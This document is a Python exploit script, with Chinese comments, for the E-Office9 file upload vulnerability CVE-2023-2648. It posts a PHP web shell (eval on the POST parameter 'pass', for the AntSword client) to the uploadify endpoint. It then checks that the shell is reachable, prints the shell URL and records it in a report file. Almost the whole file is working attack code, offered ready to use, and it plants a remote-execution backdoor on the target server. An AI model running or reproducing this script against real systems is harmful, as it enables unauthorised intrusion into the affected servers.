import requests
import time


class colors:
    # 定义颜色代码
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

filename = "./reps/E-Office9文件上传漏洞CVE-2023-2648-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }

data = '''
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="89615.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt'''

data_yijian = '''
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="89615.php"
Content-Type: application/octet-stream

<?php
eval($_POST["pass"]);

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt'''

def eofu9fileup(url):
    try:
        #蚁剑 密码pass 使用base编码连接
        req = requests.post(url=url+ "/inc/jquery/uploadify/uploadify.php", data=data_yijian, headers=headers,verify=False, timeout=5)
        
        try:
            reqs = requests.get(url=f"{url}/attachment/{req.text}/89615.php", timeout=3)
            if reqs.status_code == 200 and 5 <= len(req.text) <= 12:
                print(colors.GREEN + f"存在E-Office9文件上传漏洞CVE-2023-2648 {url}")
                print(f"上传成功请访问 : {url}/attachment/{req.text}/89615.php  进一步测试 默认shell_蚁剑_pass_base64_connect"+ colors.END)
                f = open(filename,"a+",encoding="utf-8")
                f.write(f"{url}/attachment/{req.text}/89615.php")
                f.write("\n")
                f.close()
        except Exception as e:
            print(colors.RED + f"访问shell ERROR 请手工尝试 {url}/attachment/{req.text}/89615.php" + colors.RED)
    except Exception as e:
        print(f"ERROR {e}")

